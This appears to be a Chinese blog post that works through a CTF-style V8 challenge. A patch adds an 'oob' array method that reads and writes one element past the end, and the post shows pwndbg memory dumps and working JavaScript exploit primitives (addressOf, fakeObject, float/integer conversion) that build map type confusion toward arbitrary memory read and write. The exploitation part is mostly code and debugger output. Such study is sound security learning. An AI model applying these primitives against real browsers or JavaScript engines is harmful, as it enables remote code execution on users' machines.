class="line">&#x2F;&#x2F;整型数组</span><br><span class="line">DebugPrint: 0x23ddebc4de91: [JSArray]</span><br><span class="line"> - map: 0x13e6d5782d99 &lt;Map(PACKED_SMI_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x1bb893151111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x23ddebc4ddb9 &lt;FixedArray[3]&gt; [PACKED_SMI_ELEMENTS (COW)]</span><br><span class="line"> - length: 3</span><br><span class="line"> - properties: 0x1574a0580c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x19fc51e401a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x23ddebc4ddb9 &lt;FixedArray[3]&gt; &#123;</span><br><span class="line">           0: 1</span><br><span class="line">           1: 2</span><br><span class="line">           2: 3</span><br><span class="line"> &#125;</span><br><span class="line">[...]</span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">&#x2F;&#x2F;对象数组</span><br><span class="line">DebugPrint: 0x23ddebc4ded1: [JSArray]</span><br><span class="line"> - map: 0x13e6d5782f79 &lt;Map(PACKED_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x1bb893151111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x23ddebc4deb1 &lt;FixedArray[2]&gt; [PACKED_ELEMENTS]</span><br><span class="line"> - length: 2</span><br><span class="line"> - properties: 0x1574a0580c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x19fc51e401a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x23ddebc4deb1 &lt;FixedArray[2]&gt; &#123;</span><br><span class="line">           0: 0x23ddebc4de71 &lt;JSArray[3]&gt;&#x2F;&#x2F;存储的是浮点数组的地址</span><br><span class="line">           1: 0x23ddebc4de91 &lt;JSArray[3]&gt;&#x2F;&#x2F;存储的是整型数组的地址</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p>也就是说，对象数组里面，存储的是别的对象的地址，这里存储的是浮点数组和整型数组的地址</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>分析给定文件中的oob.diff,左边行开头的地方，表示diff文件增加的内容</p>
<blockquote>
<p>该diff文件实际就是增加了一个oob函数。主要分为三部分：定义、实现和关联。</p>
</blockquote>
<p><strong>定义</strong></p>
<blockquote>
<p>为数组添加名为oob的内置函数（就是别人调用的话），内部调用的函数名是kArrayOob（实现oob的函数）</p>
</blockquote>
<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line">src/bootstrapper.cc</span><br><span class="line"><span class="addition">+    SimpleInstallFunction(isolate_, proto, "oob",</span></span><br><span class="line"><span class="addition">+                          Builtins::kArrayOob,2,false);</span></span><br></pre></td></tr></table></figure>
<p><strong>实现</strong></p>
<blockquote>
<ul>
<li>函数将首先检查参数的数量是否大于2（第一个参数始终是<code>this</code>参数）。如果是，则返回undefined。</li>
<li>如果只有一个参数（<code>this</code>），它将数组转换成<code>FixedDoubleArray</code>，然后返回array[length]（也就是以浮点数形式返回array[length]）</li>
<li>如果有两个参数（<code>this</code>和<code>value</code>），它以float形式将<code>value</code>写入<code>array[length]</code>。</li>
</ul>
</blockquote>
<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line">src/builtins/builtins-array.cc</span><br><span class="line"><span class="addition">+BUILTIN(ArrayOob)&#123;</span></span><br><span class="line"><span class="addition">+    uint32_t len = args.length();</span></span><br><span class="line"><span class="addition">+    if(len &gt; 2) return ReadOnlyRoots(isolate).undefined_value();</span></span><br><span class="line"><span class="addition">+    Handle&lt;JSReceiver&gt; receiver;</span></span><br><span class="line"><span class="addition">+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span></span><br><span class="line"><span class="addition">+            isolate, receiver, Object::ToObject(isolate, args.receiver()));</span></span><br><span class="line"><span class="addition">+    Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver);</span></span><br><span class="line"><span class="addition">+    FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements());</span></span><br><span class="line"><span class="addition">+    uint32_t length = static_cast&lt;uint32_t&gt;(array-&gt;length()-&gt;Number());</span></span><br><span class="line"><span class="addition">+    if(len == 1)&#123;</span></span><br><span class="line"><span class="addition">+        //read</span></span><br><span class="line"><span class="addition">+        return *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length)));</span></span><br><span class="line"><span class="addition">+    &#125;else&#123;</span></span><br><span class="line"><span class="addition">+        //write</span></span><br><span class="line"><span class="addition">+        Handle&lt;Object&gt; value;</span></span><br><span class="line"><span class="addition">+        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span></span><br><span class="line"><span class="addition">+                isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(1)));</span></span><br><span class="line"><span class="addition">+        elements.set(length,value-&gt;Number());</span></span><br><span class="line"><span class="addition">+        return ReadOnlyRoots(isolate).undefined_value();</span></span><br><span class="line"><span class="addition">+    &#125;</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br></pre></td></tr></table></figure>
<p><strong>重点</strong></p>
<p>漏洞就出在这个函数里面</p>
<ul>
<li><p>如果给一个参数，返回了array[length]</p>
</li>
<li><p>如果给两个参数，将给定的参数写入array[length]</p>
</li>
</ul>
<p>很显然array[length]这里冒了，访问到了数组后面的内存区域。调试看一下后面这个内存存储什么信息。</p>
<p>使用debug版本</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//test.js</span></span><br><span class="line"><span class="keyword">var</span> a = [<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>];</span><br><span class="line">%DebugPrint(a);</span><br><span class="line">%SystemBreak();</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">winter@ubuntu:~&#x2F;v8&#x2F;v8&#x2F;out.gn&#x2F;x64.debug$ gdb .&#x2F;d8 </span><br><span class="line">[...]</span><br><span class="line">pwndbg&gt; set args --allow-natives-syntax test.js </span><br><span class="line">pwndbg&gt; r</span><br><span class="line">[...]</span><br><span class="line">DebugPrint: 0x71b3a0cde29: [JSArray]</span><br><span class="line"> - map: 0x288120f02ed9 &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x3086d0311111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x071b3a0cde01 &lt;FixedDoubleArray[3]&gt; [PACKED_DOUBLE_ELEMENTS]</span><br><span class="line"> - length: 3</span><br><span class="line"> - properties: 0x109193c80c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x2f6f5d1801a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x071b3a0cde01 &lt;FixedDoubleArray[3]&gt; &#123;</span><br><span class="line">           0: 1.1</span><br><span class="line">           1: 2.2</span><br><span class="line">           2: 3.3</span><br><span class="line"> &#125;</span><br><span class="line">0x288120f02ed9: [Map]</span><br><span class="line"> - type: JS_ARRAY_TYPE</span><br><span class="line"> - instance size: 32</span><br><span class="line"> - inobject properties: 0</span><br><span class="line"> - elements kind: PACKED_DOUBLE_ELEMENTS</span><br><span class="line"> - unused property fields: 0</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - back pointer: 0x288120f02e89 &lt;Map(HOLEY_SMI_ELEMENTS)&gt;</span><br><span class="line"> - prototype_validity cell: 0x2f6f5d180609 &lt;Cell value&#x3D; 1&gt;</span><br><span class="line"> - instance descriptors #1: 0x3086d0311f49 &lt;DescriptorArray[1]&gt;</span><br><span class="line"> - layout descriptor: (nil)</span><br><span class="line"> - transitions #1: 0x3086d0311eb9 &lt;TransitionArray[4]&gt;Transition array #1:</span><br><span class="line">     0x109193c84ba1 &lt;Symbol: (elements_transition_symbol)&gt;: (transition to HOLEY_DOUBLE_ELEMENTS) -&gt; 0x288120f02f29 &lt;Map(HOLEY_DOUBLE_ELEMENTS)&gt;</span><br><span class="line"></span><br><span class="line"> - prototype: 0x3086d0311111 &lt;JSArray[0]&gt;</span><br><span class="line"> - constructor: 0x3086d0310ec1 &lt;JSFunction Array (sfi &#x3D; 0x2f6f5d18aca1)&gt;</span><br><span class="line"> - dependent code: 0x109193c802c1 &lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)&gt;</span><br><span class="line"> - construction counter: 0</span><br><span class="line">[...]</span><br><span class="line">&#x2F;&#x2F;查看elements的内存地址</span><br><span class="line">pwndbg&gt; telescope 0x071b3a0cde01-1</span><br><span class="line">00:0000│   0x71b3a0cde00 —▸ 0x109193c814f9 ◂— 0x109193c801</span><br><span class="line">01:0008│   0x71b3a0cde08 ◂— 0x300000000</span><br><span class="line">02:0010│   0x71b3a0cde10 ◂— 0x3ff199999999999a</span><br><span class="line">03:0018│   0x71b3a0cde18 ◂— 0x400199999999999a</span><br><span class="line">04:0020│   0x71b3a0cde20 ◂— 0x400a666666666666 (&#39;ffffff\n@&#39;)</span><br><span class="line">05:0028│   0x71b3a0cde28 —▸ 0x288120f02ed9 ◂— 0x40000109193c801</span><br><span class="line">06:0030│   0x71b3a0cde30 —▸ 0x109193c80c71 ◂— 0x109193c808</span><br><span class="line">07:0038│   0x71b3a0cde38 —▸ 0x71b3a0cde01 ◂— 0x109193c814</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;element+10开始的地方，存储的是数据</span><br><span class="line">pwndbg&gt; p &#123;double &#125; 0x71b3a0cde10</span><br><span class="line">$1 &#x3D; 1.1000000000000001</span><br><span class="line">pwndbg&gt; p &#123;double &#125; 0x71b3a0cde18</span><br><span class="line">$2 &#x3D; 2.2000000000000002</span><br><span class="line">pwndbg&gt; p &#123;double &#125; 0x71b3a0cde20</span><br><span class="line">$3 &#x3D; 3.2999999999999998</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;查看冒出来地址里存储的数据，发现存储的是map</span><br><span class="line">pwndbg&gt; job 0x288120f02ed9</span><br><span class="line">0x288120f02ed9: [Map]</span><br><span class="line"> - type: JS_ARRAY_TYPE</span><br><span class="line"> - instance size: 32</span><br><span class="line"> - inobject properties: 0</span><br><span class="line"> - elements kind: PACKED_DOUBLE_ELEMENTS</span><br><span class="line"> - unused property fields: 0</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - back pointer: 0x288120f02e89 &lt;Map(HOLEY_SMI_ELEMENTS)&gt;</span><br><span class="line"> - prototype_validity cell: 0x2f6f5d180609 &lt;Cell value&#x3D; 1&gt;</span><br><span class="line"> - instance descriptors #1: 0x3086d0311f49 &lt;DescriptorArray[1]&gt;</span><br><span class="line"> - layout descriptor: (nil)</span><br><span class="line"> - transitions #1: 0x3086d0311eb9 &lt;TransitionArray[4]&gt;Transition array #1:</span><br><span class="line">     0x109193c84ba1 &lt;Symbol: (elements_transition_symbol)&gt;: (transition to HOLEY_DOUBLE_ELEMENTS) -&gt; 0x288120f02f29 &lt;Map(HOLEY_DOUBLE_ELEMENTS)&gt;</span><br><span class="line"></span><br><span class="line"> - prototype: 0x3086d0311111 &lt;JSArray[0]&gt;</span><br><span class="line"> - constructor: 0x3086d0310ec1 &lt;JSFunction Array (sfi &#x3D; 0x2f6f5d18aca1)&gt;</span><br><span class="line"> - dependent code: 0x109193c802c1 &lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)&gt;</span><br><span class="line"> - construction counter: 0</span><br></pre></td></tr></table></figure>
<p>综上，我们得到的是读写map和修改map的功能</p>
<p>我们在release版本下实际调试</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>];</span><br><span class="line">%DebugPrint(a);</span><br><span class="line">%SystemBreak();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> data = a.oob();</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[*] oob return data:"</span> + data.toString());</span><br><span class="line">%SystemBreak();</span><br><span class="line"></span><br><span class="line">a.oob(<span class="number">2</span>);</span><br><span class="line">%SystemBreak();</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">winter@ubuntu:~&#x2F;v8&#x2F;v8&#x2F;out.gn&#x2F;x64.release$ gdb .&#x2F;d8 </span><br><span class="line">[...]</span><br><span class="line">pwndbg&gt; set args --allow-natives-syntax test.js </span><br><span class="line">pwndbg&gt; r</span><br><span class="line">[...]</span><br><span class="line">0x2c5f52b0de29 &lt;JSArray[3]&gt;</span><br><span class="line">&#x2F;&#x2F;打印对象内存地址</span><br><span class="line">pwndbg&gt; telescope 0x2c5f52b0de29-1</span><br><span class="line">00:0000│   0x2c5f52b0de28 —▸ 0x344502282ed9 ◂— 0x400003ee9994c01    &lt;&#x3D; 对象的map                                    nmap</span><br><span class="line">01:0008│   0x2c5f52b0de30 —▸ 0x3ee9994c0c71 ◂— 0x3ee9994c08         &lt;&#x3D; prototype	</span><br><span class="line">02:0010│   0x2c5f52b0de38 —▸ 0x2c5f52b0de01 ◂— 0x3ee9994c14			&lt;&#x3D; element</span><br><span class="line">03:0018│   0x2c5f52b0de40 ◂— 0x300000000							&lt;&#x3D; length</span><br><span class="line">04:0020│   0x2c5f52b0de48 ◂— 0x0</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;打印element内存地址</span><br><span class="line">pwndbg&gt; telescope 0x2c5f52b0de01-1</span><br><span class="line">00:0000│   0x2c5f52b0de00 —▸ 0x3ee9994c14f9 ◂— 0x3ee9994c01			 </span><br><span class="line">01:0008│   0x2c5f52b0de08 ◂— 0x300000000							 &lt;&#x3D; length</span><br><span class="line">02:0010│   0x2c5f52b0de10 ◂— 0x3ff199999999999a						 &lt;&#x3D; 第一个值</span><br><span class="line">03:0018│   0x2c5f52b0de18 ◂— 0x400199999999999a						 &lt;&#x3D; 第二个值</span><br><span class="line">04:0020│   0x2c5f52b0de20 ◂— 0x400a666666666666 (&#39;ffffff\n@&#39;)        &lt;&#x3D; 第二个值</span><br><span class="line">05:0028│   0x2c5f52b0de28 —▸ 0x344502282ed9 ◂— 0x400003ee9994c01	 &lt;&#x3D;对象的map</span><br><span class="line">06:0030│   0x2c5f52b0de30 —▸ 0x3ee9994c0c71 ◂— 0x3ee9994c08</span><br><span class="line">07:0038│   0x2c5f52b0de38 —▸ 0x2c5f52b0de01 ◂— 0x3ee9994c14</span><br><span class="line"></span><br><span class="line">pwndbg&gt; p &#123;double &#125; 0x71b3a0cde10</span><br><span class="line">$1 &#x3D; 1.1000000000000001</span><br><span class="line">pwndbg&gt; p &#123;double &#125; 0x71b3a0cde18</span><br><span class="line">$2 &#x3D; 2.2000000000000002</span><br><span class="line">pwndbg&gt; p &#123;double &#125; 0x71b3a0cde20</span><br><span class="line">$3 &#x3D; 3.2999999999999998</span><br><span class="line"></span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">[*] oob return data:2.8394443558087e-310&#x2F;&#x2F;和泄漏出来的一样</span><br><span class="line"></span><br><span class="line">pwndbg&gt; p &#123;double &#125; 0x2c5f52b0de28</span><br><span class="line">$2 &#x3D; 2.8394443558087202e-310</span><br><span class="line"></span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">pwndbg&gt; telescope 0x2c5f52b0de01-1</span><br><span class="line">00:0000│   0x2c5f52b0de00 —▸ 0x3ee9994c14f9 ◂— 0x3ee9994c01</span><br><span class="line">01:0008│   0x2c5f52b0de08 ◂— 0x300000000</span><br><span class="line">02:0010│   0x2c5f52b0de10 ◂— 0x3ff199999999999a</span><br><span class="line">03:0018│   0x2c5f52b0de18 ◂— 0x400199999999999a</span><br><span class="line">04:0020│   0x2c5f52b0de20 ◂— &#39;ffffff\n@&#39;</span><br><span class="line">05:0028│   0x2c5f52b0de28 ◂— 0x4000000000000000</span><br><span class="line">06:0030│   0x2c5f52b0de30 —▸ 0x3ee9994c0c71 ◂— 0x3ee9994c08</span><br><span class="line">07:0038│   0x2c5f52b0de38 —▸ 0x2c5f52b0de01 ◂— 0x3ee9994c14</span><br><span class="line">pwndbg&gt; p &#123;double &#125; 0x2c5f52b0de28</span><br><span class="line">$3 &#x3D; 2&#x2F;&#x2F;被覆盖了</span><br></pre></td></tr></table></figure>
<p><strong>关联</strong></p>
<blockquote>
<p>为kArrayOob类型做了与实现函数的关联：</p>
</blockquote>
<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line">src/builtins/builtins-definitions.h</span><br><span class="line"><span class="addition">+  CPP(ArrayOob)                                                                \</span></span><br><span class="line"></span><br><span class="line">/src/compiler/typer.cc</span><br><span class="line">       return Type::Receiver();</span><br><span class="line">     case Builtins::kArrayUnshift:</span><br><span class="line">       return t-&gt;cache_-&gt;kPositiveSafeInteger;</span><br><span class="line"><span class="addition">+    case Builtins::kArrayOob:</span></span><br><span class="line"><span class="addition">+      return Type::Receiver();</span></span><br></pre></td></tr></table></figure>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="类型混淆"><a href="#类型混淆" class="headerlink" title="类型混淆"></a>类型混淆</h3><p>由于v8完全依赖Map类型对js对象进行解析。</p>
<p>所以，我们通过修改对象的map，将对象数组的map设置为浮点数组的map，就能让v8解析原来的对象数组的时候，解析成为浮点数组，反之同理。由于两种数组内部存储的不同，可以实现一些小功能。</p>
<ul>
<li><p>对象数组存储的是每个对象的地址，也就是对象数组存的是地址。</p>
</li>
<li><p>浮点数组存储的是浮点型是的数值。</p>
</li>
</ul>
<h4 id="addressOf"><a href="#addressOf" class="headerlink" title="addressOf"></a>addressOf</h4><blockquote>
<p>泄露某个对象的内存地址，日后可以实现任意地址读的功能。</p>
</blockquote>
<p>因为对象数组存储的是地址，但是如果v8解析是对象数组的话，肯定就不会输出这个地址，而是找到这个对象再操作。但是，如果，让v8误以为这是一个浮点数组，那么，v8就把把这个地址当作是浮点数，以浮点数的形式将对象数组里面存储的对象地址输出了。</p>
<p>所以，步骤如下：</p>
<p>1.拿到要泄漏的地址</p>
<p>2.把这个地址，覆盖已经创建好的对象数组第一个元素obj_array[0]（让地址成为对象数组的一员）</p>
<p>3.将对象数组的map替换为浮点数组的map</p>
<p>4.输出数组的第一个元素，此时，就会按照浮点形式，将地址里的内容输出出来。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;<span class="string">"a"</span>: <span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> obj_array = [obj];</span><br><span class="line"><span class="keyword">var</span> float_array = [<span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">var</span> obj_array_map = obj_array.oob();<span class="comment">//oob函数出来的就是map</span></span><br><span class="line"><span class="keyword">var</span> float_array_map = float_array.oob();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 泄露某个object的地址</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addressOf</span>(<span class="params">obj_to_leak</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    obj_array[<span class="number">0</span>] = obj_to_leak;</span><br><span class="line">    obj_array.oob(float_array_map);</span><br><span class="line">    <span class="keyword">let</span> obj_addr = f2i(obj_array[<span class="number">0</span>]) - <span class="number">1n</span>;<span class="comment">//泄漏出来的地址-1才是真实地址</span></span><br><span class="line">    obj_array.oob(obj_array_map); <span class="comment">// 还原array类型以便后续继续使用</span></span><br><span class="line">    <span class="keyword">return</span> obj_addr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="fakeObject"><a href="#fakeObject" class="headerlink" title="fakeObject"></a>fakeObject</h4><blockquote>
<p>将指定内存地址强制转换为一个js对象，日后可以实现任意地址写的功能。</p>
</blockquote>
<p>现在，有了地址，地址是一个整数，整数可以直接变成以浮点数表示，但是不能变成对象，所以还是需要混淆。</p>
<p>步骤：</p>
<p>1.拿到地址，转换为浮点数表示。</p>
<p>2.放入浮点数组第一个位置中。</p>
<p>3.将浮点数组的map替换为对象数组的map</p>
<p>4.数组的第一个位置上，内存地址就已经变成一个js对象了。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fakeObject</span>(<span class="params">addr_to_fake</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    float_array[<span class="number">0</span>] = i2f(addr_to_fake + <span class="number">1n</span>);<span class="comment">//地址需要+1才是v8中的正确表达方式</span></span><br><span class="line">    float_array.oob(obj_array_map);</span><br><span class="line">    <span class="keyword">let</span> faked_obj = float_array[<span class="number">0</span>];</span><br><span class="line">    float_array.oob(float_array_map); <span class="comment">// 还原array类型以便后续继续使用</span></span><br><span class="line">    <span class="keyword">return</span> faked_obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="辅助的工具函数"><a href="#辅助的工具函数" class="headerlink" title="辅助的工具函数"></a>辅助的工具函数</h4><p>浮点数转整数、整数转浮点数、字节串表示整数</p>
<p>实现方法：开辟一块空间，创建两个数组，分别是浮点数组float64和整数数组bigUint64，他们公用创造的那块空间。</p>
<p>这样，根据原来的形式放入对应的数组，用转换的数组输出即可。</p>
<p>例如：f2i()，要将浮点数转换为整数，只要将浮点数放入浮点数组，然后用整数数组输出，因为空间是一个，所以，输入输出的是同一个值，但由于数组的属性不同，会按数组的属性进行解释，进来的时候是浮点数，比如存入了0001H单元，然后输出的时候，还会读这个0001H单元，但是这个时候，用的是整数数组，所以会把它以整数的格式输出。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> buf =<span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">16</span>);</span><br><span class="line"><span class="keyword">var</span> float64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buf);</span><br><span class="line"><span class="keyword">var</span> bigUint64 = <span class="keyword">new</span> BigUint64Array(buf);</span><br><span class="line"><span class="comment">// 浮点数转换为64位无符号整数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f2i</span>(<span class="params">f</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    float64[<span class="number">0</span>] = f;</span><br><span class="line">    <span class="keyword">return</span> bigUint64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 64位无符号整数转为浮点数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">i2f</span>(<span class="params">i</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    bigUint64[<span class="number">0</span>] = i;</span><br><span class="line">    <span class="keyword">return</span> float64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 64位无符号整数转为16进制字节串</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">i</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> i.toString(<span class="number">16</span>).padStart(<span class="number">16</span>, <span class="string">"0"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>整合在一起调试：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ××××××××1. 无符号64位整数和64位浮点数的转换代码××××××××</span></span><br><span class="line"><span class="keyword">var</span> buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">16</span>);</span><br><span class="line"><span class="keyword">var</span> float64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buf);</span><br><span class="line"><span class="keyword">var</span> bigUint64 = <span class="keyword">new</span> BigUint64Array(buf);</span><br><span class="line"><span class="comment">// 浮点数转换为64位无符号整数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f2i</span>(<span class="params">f</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    float64[<span class="number">0</span>] = f;</span><br><span class="line">    <span class="keyword">return</span> bigUint64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 64位无符号整数转为浮点数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">i2f</span>(<span class="params">i</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    bigUint64[<span class="number">0</span>] = i;</span><br><span class="line">    <span class="keyword">return</span> float64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 64位无符号整数转为16进制字节串</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">i</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> i.toString(<span class="number">16</span>).padStart(<span class="number">16</span>, <span class="string">"0"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ××××××××2. addressOf和fakeObject的实现××××××××</span></span><br><span class="line"><span class="keyword">var</span> obj = &#123;<span class="string">"a"</span>: <span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> obj_array = [obj];</span><br><span class="line"><span class="keyword">var</span> float_array = [<span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">var</span> obj_array_map = obj_array.oob();<span class="comment">//oob函数出来的就是map</span></span><br><span class="line"><span class="keyword">var</span> float_array_map = float_array.oob();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 泄露某个object的地址</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addressOf</span>(<span class="params">obj_to_leak</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    obj_array[<span class="number">0</span>] = obj_to_leak;</span><br><span class="line">    obj_array.oob(float_array_map);</span><br><span class="line">    <span class="keyword">let</span> obj_addr = f2i(obj_array[<span class="number">0</span>]) - <span class="number">1n</span>;<span class="comment">//泄漏出来的地址-1才是真实地址</span></span><br><span class="line">    obj_array.oob(obj_array_map); <span class="comment">// 还原array类型以便后续继续使用</span></span><br><span class="line">    <span class="keyword">return</span> obj_addr;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fakeObject</span>(<span class="params">addr_to_fake</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    float_array[<span class="number">0</span>] = i2f(addr_to_fake + <span class="number">1n</span>);<span class="comment">//地址需要+1才是v8中的正确表达方式</span></span><br><span class="line">    float_array.oob(obj_array_map);</span><br><span class="line">    <span class="keyword">let</span> faked_obj = float_array[<span class="number">0</span>];</span><br><span class="line">    float_array.oob(float_array_map); <span class="comment">// 还原array类型以便后续继续使用</span></span><br><span class="line">    <span class="keyword">return</span> faked_obj;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ××××××××3. 测试××××××××</span></span><br><span class="line"><span class="keyword">var</span> test_obj = &#123;&#125;;</span><br><span class="line">%DebugPrint(test_obj);</span><br><span class="line"><span class="keyword">var</span> test_obj_addr = addressOf(test_obj);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[*] leak object addr: 0x"</span> + hex(test_obj_addr));</span><br><span class="line">%SystemBreak();</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; r</span><br><span class="line">[...]</span><br><span class="line">0x189f4fdcf201 &lt;Object map &#x3D; 0x2ded805c0459&gt;</span><br><span class="line">[*] leak object addr: 0x0000189f4fdcf200</span><br></pre></td></tr></table></figure>
<p>成功泄漏对象的地址。同样，利用fakeObject可以将某个内存地址转换为一个object对象。</p>
<h3 id="任意地址读写"><a href="#任意地址读写" class="headerlink" title="任意地址读写"></a>任意地址读写</h3><blockquote>
<p>我们首先构造一个假的数组对象，我们可以用fakeObject将其转换为一个object对象。因为自己构造的elements指针是可控的，而这个指针是指向存储数组元素内容的内存地址。所以，只要在elements上放入我们想要读写的地址，就可以用对象进行读写操作了。</p>
</blockquote>
<p>步骤：</p>
<p>1.利用可控内存，伪造自己的对象结构。</p>
<p>2.将自己伪造的对象结构转换为真的对象。</p>
<p><img src="/2020/10/23/17-42/image-20201016182937097.png" alt="image-20201016182937097"></p>
<p>我们伪造的是一个对象在内存中的表示，只有这样，elements才是我们自己可以填的。通过addressOf找到是，伪造的对象数组在内存中的地址，也就是他的对象结构开头，真实存储的内容在<strong>泄漏的地址-伪造的长度（6×0x8）</strong>，然后我们要让v8认为真实存储的内容是一个对象，所以对<strong>泄漏的地址-伪造的长度（6×0x8）</strong>做fakeObject，那么，我们构造的这个数组，就真的成为了一个对象在内存的表示。</p>
<p>3.任意地址读。给定的地址是要读的地址，elements在读写的数据-0x10。把这个伪造的elements给伪造的内存，然后利用上述第二步，变成一个对象（fake_object是用fake_array出来的），读取对象的元素，就是地址的内容了。</p>
<p><img src="/2020/10/23/17-42/image-20201016185416667.png" alt="image-20201016185416667"></p>
<p>4.任意地址写也是一样。把地址变成一个对象，那么要写入的地址就是我们对象的数据了。</p>
